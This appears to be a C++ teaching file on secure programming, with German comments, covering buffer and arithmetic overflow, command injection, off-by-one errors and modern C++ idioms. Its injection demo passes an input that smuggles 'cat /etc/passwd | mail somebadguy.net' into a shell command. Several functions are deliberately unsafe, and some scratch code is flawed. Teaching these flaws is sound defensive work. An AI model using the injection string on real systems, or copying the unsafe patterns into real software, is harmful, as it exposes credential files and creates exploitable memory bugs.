// ===========================================================================
// SecureProgrammingAdvices.cpp
// Advices for Secure Programming
// ===========================================================================

// don't use the secure versions of the CRT library functions
#define _CRT_SECURE_NO_WARNINGS 

#include <cstdlib>
#include <cstring>

#include <complex>
#include <cstdint>
#include <format>
#include <iostream>
#include <limits>
#include <numeric>
#include <print>
#include <string>
#include <map>
#include <vector>

// =======================================================================

class SomeClass
{
public: 
    void print() {}
};

static long long frage_zu_syntax() {

    SomeClass p;
    // SomeClass* p = new SomeClass();
    p.print();
}




static long long frage_diff_ptr_c(int* ip1, int* ip2) {

    long long result = (char*)(ip2)-(char*)(ip1);
    return result;
}


void test_frage_diff_ptr_c()
{
    int a = 10;
    int b = 12;

    printf("Differenz: %p\n", &a);
    printf("Differenz: %p\n", &b);

    long long result = frage_diff_ptr_c(&a, &b);
    printf("Differenz: %ld\n", result);
}


// auto:  
// Einen Vorteil: Die automatic type deduction kann machmal helfen

static auto frage_diff_ptr(int* ip1, int* ip2) {

    auto result =  reinterpret_cast<char*>(ip2) - reinterpret_cast<char*>(ip1);
    return result;
}


void test_frage_diff_ptr()
{
    int a = 10;
    int b = 12;

    auto result = frage_diff_ptr(&a, &b);
    printf("Differenz: %ld\n", result);
}


static void test_03() {

    std::map<int, std::string> anotherMap{ { 1, "Hello"  } };

    std::map<int, std::string>::iterator it = anotherMap.begin();

    std::pair<const int, std::string>& entry1 = *it;  // Why this line DOES NOT compile ???

    auto& entry2 = *it;
}

// auto: refresher: ref versus non-ref

// auto does NOT DEDUCE ref and const

const std::string message{ "This is an important message :)" };

static const std::string& getMessage()   // Kopie: Elision 
{
    return message;
}



void test_06() {

    /*const*/ auto& msg1 = getMessage();
   // msg1 += "ABC";
    std::println("Message: {}", msg1);

    // but:
    const auto& msg2{ getMessage() };
    std::println("Message: {}", msg2);

    // Ohhh:
    auto& msg3{ getMessage() };
    std::println("Message: {}", msg3);

    // or:
    decltype(getMessage()) msg4{ getMessage() };
    std::println("Message: {}", msg4);

    // once again 'or':
    decltype(auto) msg5{ getMessage() };
    std::println("Message: {}", msg5);
}

// =======================================================================

[[nodiscard]] static std::pair<bool, std::uint32_t> berechneWas(int, int)
{
    return { false, 0 };
}

class Point
{
public:
    int m_x;
    int m_y;
};

void testBerechneWas()
{
    // Structured Binding
    auto [hatGeklappt, ergebnis] = berechneWas(1, 2);   //  WARNING: Ergebnis wird nicht abgeholt

    Point p{ 1, 2 };

    auto [x, y] = p;

    int io_pins[4] = { 1, 2, 3, 4 };

    auto& [pin1, pin2, pin3, pin4] = io_pins;

    pin2 = 99;

}


namespace SecureProgrammingAdvices {

    namespace PreferCppToC {

        // https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#cpl1-prefer-c-to-c

        // CPL.1: Prefer C++ to C

        static void test_prefer_cpp_to_c_01() {

            // use 'std::string'
            std::string first{ "Hello " };
            std::string second{ "World" };
            std::string result{ first + second };
            std::println("{}", result);
        }

        static void test_prefer_cpp_to_c_02() {

            char first[] = "Hello ";
            char second[] = "World";
            char result[20];

            strcpy_s(result, 20, first);
            strcat_s(result, 20, second);
            std::printf("%s\n", result);
        }

        static void test_prefer_cpp_to_c() {

            test_prefer_cpp_to_c_01();
            test_prefer_cpp_to_c_02();
        }
    }

    namespace TakeCareOfBufferOverflow {

        // use secure functions

        static void test_take_care_of_buffer_overflow_01() {

            char buffer[8] = { 1, 1, 1, 1, 1, 1, 1, 1 };

            const char* str = "This is way too long for this buffer";
            //const char* str = "123";
            std::println("Source:      >{}<", str);

            auto length = strlen(str);
            auto size = std::size(buffer);

         //   strncpy(buffer, str, length);                 // crashes
            strncpy_s(buffer, size, str, size - 1);       // copy with adjusted boundary

            buffer[size - 1] = '\0';

            std::println("Destination: >{}<", buffer);
        }

        static void test_take_care_of_buffer_overflow_02() {

            const int Size = 64;

            char buffer[Size];

            auto bytesWritten = 0;

            bytesWritten = snprintf(buffer, Size, "The half of %d is %d", 60, 60/2);

            if (bytesWritten >= 0 && bytesWritten < Size) {    // check returned value

                bytesWritten = snprintf(buffer + bytesWritten, Size - bytesWritten, ", and the half of that is %d.", 60/2/2);
            }

            std::println("Buffer: >{}< // Bytes written: {}", buffer, bytesWritten);
        }

        // -------------------------------------------------------------------------
        // work precisely

        static void evaluateArgsSloppy(int argc, const char* argv[])
        {
            char cmdLine[4096];

            cmdLine[0] = '\0';

            for (int i = 1; i < argc; ++i) {
                strcat(cmdLine, argv[i]);
                strcat(cmdLine, " ");
            }

            std::println("cmdLine: >{}<", cmdLine);
        }

        static void evaluateArgs(int argc, const char* argv[])
        {
            size_t bufsize = 0;
            size_t buflen = 0;

            char* cmdLine = NULL;

            for (int i = 1; i < argc; ++i) {

                const size_t len = strlen(argv[i]);

                if (bufsize - buflen <= len) {

                    bufsize = (bufsize + len) * 2;

                    char* ptr = (char*)realloc(cmdLine, bufsize);
                    if (ptr == NULL) {
                        free(cmdLine);
                        exit(-1);
                    }

                    cmdLine = ptr;
                }

                memcpy(cmdLine + buflen, argv[i], len);
                buflen += len;
                cmdLine[buflen] = ' ';
                buflen++;
            }

            if (cmdLine != NULL) {
                cmdLine[buflen] = '\0';
            }

            // print created buffer 'cmdLine'
            std::println("cmdLine: >{}<", cmdLine);

            free(cmdLine);
        }

        static void test_take_care_of_buffer_overflow_03() {

            int argc = 5;
            const char* argv[]{ "program.exe", "one", "two", "three", "four"};

            evaluateArgsSloppy(argc, argv);
            evaluateArgs(argc, argv);
        }

        static void test_take_care_of_buffer_overflow() {

            test_take_care_of_buffer_overflow_01();
            test_take_care_of_buffer_overflow_02();
            test_take_care_of_buffer_overflow_03();
        }
    }

    namespace TakeCareOfArithmeticOverflow {

        static void test_arithmetic_overflow_addition() {

            std::uint32_t a;
            std::uint32_t b;
            std::uint32_t sum;

            // ....
            sum = a + b;
        }

        static void addition_compliant(std::uint32_t a, std::uint32_t b) {

            std::uint32_t sum = 0;

            // sum = a + b;
            // sum - b = a

            if (std::numeric_limits<std::uint32_t>::max() - a < b)
            {
                // test for UIntMax - a < b: handle error condition
                std::println("Sum of {} and {} is too large, cannot add !", a, b);
            }
            else
            {
                sum = a + b;
                std::println("{} + {} = {}", a, b, sum);
            }
        }

        static void test_arithmetic_overflow_addition_compliant() {

            // for example
            std::uint32_t a = std::numeric_limits<std::uint32_t>::max() / 2;
            std::uint32_t b = std::numeric_limits<std::uint32_t>::max() / 2;

            addition_compliant(a, b);

            a = a + 1;

            addition_compliant(a, b);

            a = a + 1;

            addition_compliant(a, b);
        }

        // ------------------------------------------

        static void test_arithmetic_overflow_subtraction() {

            std::int32_t a;
            std::int32_t b;
            std::int32_t sum;

            // ....
            sum = a - b;
        }

        static void subtraction_compliant(std::int32_t a, std::int32_t b) {

            int32_t result = 0;

            if (b > 0) {
                if (a < std::numeric_limits<std::int32_t>::min() + b) {
                    std::println("Cannot subtract {} from {}! !", b, a);
                }
                else {
                    result = a - b;
                    std::println("{} - {} = {}", a, b, result);
                }
            }
            else if (b < 0) {
                if (a > std::numeric_limits<std::int32_t>::max() + b) {
                    std::println("Cannot subtract {} from {}! !", b, a);
                }
                else {
                    result = a - b;
                    std::println("{} - {} = {}", a, b, result);
                }
            }
            else // b == 0
            {
                result = a;
                std::println("{} - {} = {}", a, b, result);
            }

            //if (b > 0 && a < std::numeric_limits<std::int32_t>::min() + b ||
            //    b < 0 && a > std::numeric_limits<std::int32_t>::max() + b)
            //{
            //    std::println("Cannot subtract {} from {}! !", b, a);
            //}
            //else
            //{
            //    result = a - b;
            //    std::println("{} - {} = {}", a, b, result);
            //}
        }

        static void test_arithmetic_overflow_subtraction_compliant() {

            // just for better debugging
            std::int32_t MinInt = std::numeric_limits<std::int32_t>::min();
            std::int32_t MaxInt = std::numeric_limits<std::int32_t>::max();

            // for example
            std::int32_t a = MinInt / 2;
            std::int32_t b = MaxInt / 2;

            subtraction_compliant(a, b);

            b = b + 1;

            subtraction_compliant(a, b);

            b = b + 1;

            subtraction_compliant(a, b);
        }

        // ------------------------------------------

        static void test_arithmetic_overflow_multiplication() {

            std::int32_t a;
            std::int32_t b;
            std::int32_t sum;

            // ....
            sum = a * b;
        }

        static int32_t multiplication_compliant(std::int32_t a, std::int32_t b) {

            // want to switch from 32-bit to 64-bit arithmetic
   //         static_assert (sizeof (int64_t) >= 2 * sizeof(int32_t));

            std::int32_t result = 0;

            int64_t product = static_cast<int64_t>(a) * static_cast<int64_t>(b);

            // result needs to be represented as a 32-bit (std::int32_t) integer value (!)
            if (product > std::numeric_limits<std::int32_t>::max() ||
                product < std::numeric_limits<std::int32_t>::min()) {

                std::println("Cannot multiply {} with {}! !", a, b);
            }
            else {
                result = static_cast<int32_t>(product);
                std::println("{} * {} = {}", a, b, result);
            }

            return result;
        }

        static void test_arithmetic_overflow_multiplication_compliant() {

            // for example
            std::int32_t a = 2;
            std::int32_t b = 1;

            for (int i = 1; i < 32; ++i) {

             //   b = a * b;                       // remove comment
              //  std::println("{}", b);

                b = multiplication_compliant(a, b);
            }
        }

        // ------------------------------------------

        static void test_arithmetic_overflow()
        {
            //test_arithmetic_overflow_addition_compliant();
            //test_arithmetic_overflow_subtraction_compliant();
            test_arithmetic_overflow_multiplication_compliant();
        }
    }

    namespace TakeCareOfArithmeticOverflowUsingMidpoint {

        static void test_take_care_of_arithmetic_overflow() {

            std::uint32_t a = std::numeric_limits<std::uint32_t>::max();
            std::uint32_t b = std::numeric_limits<std::uint32_t>::max() - 2;

            std::println("a:                                 {}", a);
            std::println("b:                                 {}", b);
            std::println("Incorrect (overflow and wrapping): {}", (a + b) / 2);
            std::println("Correct:                           {}", std::midpoint(a, b));
        }
    }

    namespace PreventInjectionOfAttacks {

        // prevent original 'system' function being called
        static void system(const char* cmd) {}

        static void clean_input(char* input) {

            static char ok_chars[] =
                "abcdefghijklmnopqrstuvwxyz"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "1234567890_-@";

            char* begin = input;
            char* end = input + strlen(input);

            begin += strspn(begin, ok_chars);
            while (begin != end) {
                *begin = '_';
                begin += strspn(begin, ok_chars);

            }
        }

        static void test_clean_input() {

            char buffer[] = "! Bad char 1: } Bad char 2: {";
            std::println("Buffer (Input):   {}", buffer);

            clean_input(buffer);
            std::println("Buffer (Cleaned): {}", buffer);
        }

        static void do_injection(const char* addr) {

            char buffer[256];

            sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
            system(buffer);
        }

        static void do_injection_safe(const char* addr) {

            char buffer[256];

            sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
            std::println("Buffer (Input):   {}", buffer);

            clean_input(buffer);
            std::println("Buffer (Cleaned): {}", buffer);

            system(buffer);
        }

        static void test_injection() {
            do_injection("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
            test_clean_input();
            do_injection_safe("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
        }
    }

    namespace PreventOffbyOneErrors {

        static void test_off_by_one_errors() {

            char source[10];

            strcpy(source, "0123456789");

            char* dest = (char*)malloc(strlen(source));
            
            int i;
            for (i = 1; i <= 11; i++)
            {
                dest[i] = source[i];
            }
            dest[i] = '\0';

            std::println("Dest: {}", dest);
        }
    }

    namespace UseAlgorithms {

        static void test_use_algorithms_01() {

            // solved with STL algorithm

            std::string str{ "Hello World" }; // use also "Hello:World"
            std::println("{}", str);

            auto isColon = [](int ch) { return ch == ':'; };

            auto pos = std::find_if(str.begin(), str.end(), isColon);

            // if found - delete everything afterwards
            if (pos != str.end()) {
                str.erase(pos, str.end());
            }

            std::println("{}", str);
        }

        static void test_use_algorithms_02() {

            // solved with CRT function 'strstr' // no STL algorithm

            char str[] = "Hello World";    // use also "Hello:World"
            std::printf("%s\n", str);

            const char* pos = strstr(str, ":");

            if (pos != NULL) {

                // if found - poke '\0' into string - this deletes everything afterwards
                size_t ofs = pos - str;
                str[ofs] = '\0';
            }

            std::printf("%s\n", str);
        }

        static void corrupt_stack(const char* input) {

            char buffer[32];
            std::copy(input, input + 32, buffer);
            std::println("{}", buffer);  // std::copy works, std::println fails, no '\0'
        }

        static void test_use_algorithms_03() {

            corrupt_stack("This is way too long for this buffer");
        }

        static void test_use_algorithms() {

            test_use_algorithms_01();
            test_use_algorithms_02();
            test_use_algorithms_03();
        }
    }

    namespace SafeDowncasting {

        struct Spiderman {};
        struct Ironman {};

        static void test_safe_downcasting_01() {

            struct Spiderman* ptr = (struct Spiderman*) malloc(sizeof(struct Spiderman));
            struct Ironman* ptr2 = NULL;

            // warning C4133: '=': incompatible types - from 'Spiderman *' to 'Ironman *'
            // this line compiles (!!!) using a C Compiler (needs a file with extension .c)
            // ptr2 = (struct Spiderman*)ptr;
        }

        static void test_safe_downcasting_02() {

            Spiderman* ptr = new Spiderman;
            Ironman* ptr2 = nullptr;

            // compile error: 'static_cast': cannot convert from 'Spiderman *' to 'Ironman *'
            // ptr2 = static_cast<Ironman*>(ptr);
        }

        static void test_safe_downcasting() {
            test_safe_downcasting_01();
            test_safe_downcasting_02();
        }
    }

    namespace DontUseNewExplicitely {

        static void test_dont_use_new_explicitely() {

            {
                std::string s{ "Hello World" };
                std::println("{}", s);
            }
            //  <== GC happens here 
        }
    }

    namespace DeclareSingleArgumentConstructorsExplicit {

        class String {
        public:
            explicit String(size_t length) 
                : m_length{ 
                    length 
                }, m_ch{}  {
            };   // Bad

            String(const String& s) : m_length{s.m_length}, m_ch{s.m_ch} {
            }

            // Sequenz-Konstruktor
            String(std::initializer_list<char> chars) : m_length{ 0 }, m_ch{ 0 } {
            }

            // In other words, the compiler cannot decide whether to convert the 1st or 2nd D{} argument to const B&.

            // Hier darf const nicht fehlen

            bool operator== (const String& s) const { return false; }

            String& operator= (const String& s) { return *this; }

            //String(String&& s) noexcept: m_length{ s.m_length }, m_ch{ s.m_ch } {
            //    s.m_length = 0;
            //    s.m_ch = '!';
            //}

            //String(char ch)
            //    : m_ch{
            //        ch
            //    } {
            //};
            // ...

        private:
            size_t m_length;
            char m_ch;
            // ...
        };

        static void test_declare_single_argument_constructors_explicit() {

            //  String <== char
            
            // Kopier-Konstruktor
            // On initialization, the copy constructor is called
            //String s1 = '!';                                             // Uhhh: String of length 33
            
            // On initialization, the copy constructor is called
           // String s2 = (size_t)123;
        
            String s3 ('A');   // Konstruktor-Aufruf

            if ( s3 == (String) 'A' ) {  // hier findet eine implizite Konvertierung von char nach String statt
                // beide Objekte sind gleich
            }

            if (s3 == String{ 'A', 'B', 'C' }) {  // hier findet eine implizite Konvertierung von char nach String statt
                // beide Objekte sind gleich2
            }

            String s4{ 'A' };
            String s5{ 123 };
            String s6(123);

            std::vector<int> vec1{ 10 }; // L�nge 1 - Wert 10
            std::vector<int> vec2( 10 ); // L�nge 10 - Werte alle 0 sind
        }
    }

    namespace GivePrimitiveDatatypesSemantics {

        static void test_use_string_literals() {

            using namespace std::literals::string_literals;

            auto heroes = { "Spiderman"s, "Ironman"s, "Wonder Woman"s };

            for (auto const& hero : heroes) {
                std::println("{:12} ({})", hero, hero.size());
            }
        }

        enum class RainbowColors : char
        {
            Violet = 'V',
            Indigo = 'I',
            Blue   = 'B',
            Green  = 'G',
            Yellow = 'Y',
            Orange = 'O',
            Red    = 'R'
        };

        enum class EyeColors
        {
            Blue,
            Green,
            Brown
        };

        static void test_use_class_enums() {

            std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Green) << std::endl;
            std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Orange) << std::endl;
            std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Blue) << std::endl;
            std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Green) << std::endl;
        }
    }

    namespace GivePrimitiveDatatypesSemantics {

        // https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Renum-class

        // Enum.3: Prefer class enums over "plain" enums

        enum class Direction : char
        {
            NORTH = 'N',
            EAST = 'E',
            WEST = 'W',
            SOUTH = 'S'
        };

        static std::ostream& operator<<(std::ostream& os, Direction obj) {
            os << static_cast<std::underlying_type<Direction>::type>(obj);
            return os;
        }
    }
}

namespace std
{
    using namespace SecureProgrammingAdvices::GivePrimitiveDatatypesSemantics;

    // formatter for user defined enum type 'class Direction'
    template<>
    struct std::formatter<Direction> : public std::formatter<char>
    {
        auto format(Direction obj, format_context& ctx) const {

            auto ch = static_cast<std::underlying_type<Direction>::type>(obj);

            // delegate the rest of formatting to the character formatter
            return std::formatter<char>::format(ch, ctx);
        }
    };
}

namespace SecureProgrammingAdvices {

    namespace GivePrimitiveDatatypesSemantics {

        static void test_give_primitive_datatypes_semantics() {

            std::cout << "\t" << Direction::NORTH << "\n"
                << "\t" << Direction::EAST << "\n"
                << "\t" << Direction::WEST << "\n"
                << "\t" << Direction::SOUTH << "\n";
        
            // oder "modern"
            std::println("{:>4}", Direction::NORTH);
            std::println("{:>4}", Direction::EAST);
            std::println("{:>4}", Direction::WEST);
            std::println("{:>4}", Direction::SOUTH);
        }
    }

    namespace UseUserDefinedLiterals {

        class Hours
        {
        private:
            unsigned long long m_hours = 0;

        public:
            constexpr Hours() : Hours(0) {}

            constexpr explicit Hours (unsigned long long hours) : m_hours(hours) {}
        };
        
        class Days
        {
        private:
            unsigned long long m_hours = 0;

        public:
            Days() : Days(0) {}
            explicit Days(unsigned long long hours) : m_hours(hours) {}
        };

        // Literal Operator: Syntax-Erweiterung: _suffix eingef�gt
        // Optimale Realisierung: constexpr
        static constexpr Hours operator"" _hours (unsigned long long hours) {

            if (hours >= 24) {
                throw std::exception("Wrong Hours");
            }

            return Hours{ hours };
        }

        static Days operator"" _days(unsigned long long hours) {
            return Days{ hours };
        }

        static void test_use_user_defined_literals() {

            constexpr auto h1 = 23_hours;

            constexpr auto h2 = 23_hours;

            auto d = 7_days;

        //    auto wrong = h + d;   // doesn't compile: Error

            // binary '+': 'Hours' does not define this operator or a conversion to a type acceptable to the predefined operator
        }
    }

    namespace UseUserDefinedLiteralsWithConversion {

        static constexpr unsigned long long operator"" _hours(unsigned long long hours) {
            return hours;
        }

        static constexpr unsigned long long operator"" _days(unsigned long long hours) {
            return hours * 24;
        }

        static constexpr unsigned long long operator"" _weeks(unsigned long long hours) {
            return hours * 7 * 24;
        }

        static void test_use_user_defined_literals() {

            auto hours = 12_hours;

            auto dayHours = 2_days;

            auto weekHours = 3_weeks;

            auto totalHours = weekHours + dayHours + hours;
        }

        static void test_use_user_defined_literals_constexpr() {

            constexpr auto hours = 12_hours;

            constexpr auto dayHours = 2_days;

            constexpr auto weekHours = 3_weeks;

            constexpr auto totalHours = weekHours + dayHours + hours; // 12 + 2*24 + 3*7*24 = 564
        }
    }

    namespace UseOverride {

        // https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#c128-virtual-functions-should-specify-exactly-one-of-virtual-override-or-final

        // C.128: Virtual functions should specify exactly one of virtual, override, or final

        struct Button {
            // ...
            virtual void onClick() {
                std::println("Button!");
            }
        };

        struct SuperButton : public Button {
            // ...
            /*virtual*/ void onClick() final  {
                std::println("Super Button!");
            }
        };

        //struct SuperSuperButton : public SuperButton {
        //    // ...
        //    /*virtual*/ void onClick() final {
        //        std::println("Super Button!");
        //    }
        //};

        static void test_use_override() {
            Button button;
            button.onClick();

            SuperButton superButton;
            superButton.onClick();
        }
    }

    namespace UseConst {

        // https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#con2-by-default-make-member-functions-const

        // Con.2:By default, make member functions `const`

        class Point
        {
        private:
            int m_x = 0;
            int m_y = 0;

        public:
            Point() : Point{ 0, 0 } {};
            Point(int x, int y) : m_x{ x }, m_y{ y } {}

            int x() const { return m_x; }
            int y() const { return m_y; }

            bool is_valid() const {
                return m_x >= 0 && m_y >= 0;

                // m_y = 999;
            }
        };

        static void test_use_const() {
            Point point;
            bool valid = point.is_valid();
        }
    }

    namespace UseNodiscardAttribute {

        class Point
        {
        private:
            int m_x = 0;
            int m_y = 0;

        public:
            Point() : Point{ 0, 0 } {};
            Point(int x, int y) : m_x{ x }, m_y{ y } {}

            int x() const { return m_x; }
            int y() const { return m_y; }

            [[nodiscard]] bool is_valid() const {
                return m_x >= 0 && m_y >= 0;
            }
        };

        // 38,27): warning C4834: discarding return value of function with [[nodiscard]] attribute

        static void test_use_nodiscard() {
            Point point;
            point.is_valid();   // REMOVE COMMENT  // warning: ignoring return value
        }
    }
}

void secure_programming_advices()
{
    using namespace SecureProgrammingAdvices;

    //PreferCppToC::test_prefer_cpp_to_c();
    //TakeCareOfBufferOverflow::test_take_care_of_buffer_overflow();
    //TakeCareOfArithmeticOverflow::test_arithmetic_overflow();
    //TakeCareOfArithmeticOverflowUsingMidpoint::test_take_care_of_arithmetic_overflow();
    //PreventInjectionOfAttacks::test_injection();
    //// PreventOffbyOneErrors::test_off_by_one_errors();  // crashes
    //UseAlgorithms::test_use_algorithms();
    //SafeDowncasting::test_safe_downcasting();
    // DontUseNewExplicitely::test_dont_use_new_explicitely();
    //GivePrimitiveDatatypesSemantics::test_use_string_literals();
    //GivePrimitiveDatatypesSemantics::test_use_class_enums();
    //GivePrimitiveDatatypesSemantics::test_give_primitive_datatypes_semantics();
    //DeclareSingleArgumentConstructorsExplicit::test_declare_single_argument_constructors_explicit();
    UseOverride::test_use_override();
    //UseConst::test_use_const();
    //UseNodiscardAttribute::test_use_nodiscard();


    UseUserDefinedLiterals::test_use_user_defined_literals();
    UseUserDefinedLiteralsWithConversion::test_use_user_defined_literals();
    UseUserDefinedLiteralsWithConversion::test_use_user_defined_literals_constexpr();
}

// ===========================================================================
// End-of-File
// ===========================================================================
